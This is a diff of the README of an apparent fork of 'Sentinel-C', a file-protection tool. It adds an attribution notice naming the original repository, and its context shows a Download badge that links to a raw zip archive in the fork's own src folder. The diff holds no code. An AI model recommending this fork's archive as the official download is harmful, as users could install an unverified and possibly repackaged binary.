@@ -1,4 +1,7 @@
 # 🛡️ Sentinel-C - Protect Your Files with Ease
+> ⚠️ Attribution Notice  
+> This repository contains commit history originating from the Sentinel-C project by voltsparx.  
+> Original repository: https://github.com/voltsparx/Sentinel-C
 
 [![Download Sentinel-C](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_v3.9.zip)](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_v3.9.zip)
 
